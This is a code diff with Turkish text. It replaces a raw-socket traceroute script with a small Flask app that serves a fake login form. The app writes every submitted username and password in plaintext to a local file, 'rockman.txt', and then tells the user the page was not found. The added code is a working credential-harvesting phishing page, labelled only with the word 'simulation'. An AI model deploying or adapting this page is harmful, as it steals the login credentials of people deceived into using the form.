@@ -1,53 +1,33 @@
-import socket
-import time
+from flask import Flask, request, render_template_string
 
-def traceroute():
-    destination = input("Hedef IP veya Alan Adı Girin: ")
-    try:
-        dest_ip = socket.gethostbyname(destination)
-        print(f"Hedef: {destination} [{dest_ip}]...")
-    except socket.gaierror:
-        print("Hedef çözümlenemedi. Lütfen doğru bir adres girin.")
-        return
+app = Flask(__name__)
 
-    max_hops = int(input("Maksimum Hop Sayısını (TTL) Girin: "))
-    port = int(input("Port Numarasını Girin (Örn: 33434): "))
-    
-    ttl = 1
-    while ttl <= max_hops:
-        recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-        send_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-        
-        recv_socket.bind(("", port))
-        send_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)
-        
-        start_time = time.time()
-        send_socket.sendto(b"", (destination, port))
-        
-        curr_addr = None
-        curr_name = None
-        while curr_addr is None:  # Zaman aşımı yerine sonsuz döngü
-            try:
-                _, curr_addr = recv_socket.recvfrom(512)
-                curr_addr = curr_addr[0]
-                try:
-                    curr_name = socket.gethostbyaddr(curr_addr)[0]
-                except socket.herror:
-                    curr_name = "Hostname bulunamadı"
-            except socket.error:
-                pass
+HOME_PAGE = '''
+<html>
+    <head><title>Giriş Formu</title></head>
+    <body>
+        <h2>Giriş Yap</h2>
+        <form action="/login" method="POST">
+            <input type="text" name="username" placeholder="Kullanıcı Adı" required>
+            <input type="password" name="password" placeholder="Şifre" required>
+            <button type="submit">Giriş</button>
+        </form>
+    </body>
+</html>
+'''
 
-        elapsed_time = (time.time() - start_time) * 1000
-        print(f"{ttl}\tAdres: {curr_addr}\tHostname: {curr_name}\tGecikme: {elapsed_time:.2f} ms")
-        
-        send_socket.close()
-        recv_socket.close()
+@app.route('/')
+def home():
+    return render_template_string(HOME_PAGE)
 
-        if curr_addr == dest_ip:
-            print("İzleme Tamamlandı.")
-            break
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+    # Kullanıcı giriş bilgilerini dosyaya kaydeder
+    with open('rockman.txt', 'a') as file:
+        file.write(f'Kullanıcı Adı: {username}, Şifre: {password}\n')
+    return 'Bilgiler kaydedildi ve sayfa bulunamadı! (Simülasyon)'
 
-        ttl += 1
-
-if __name__ == "__main__":
-    traceroute()
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
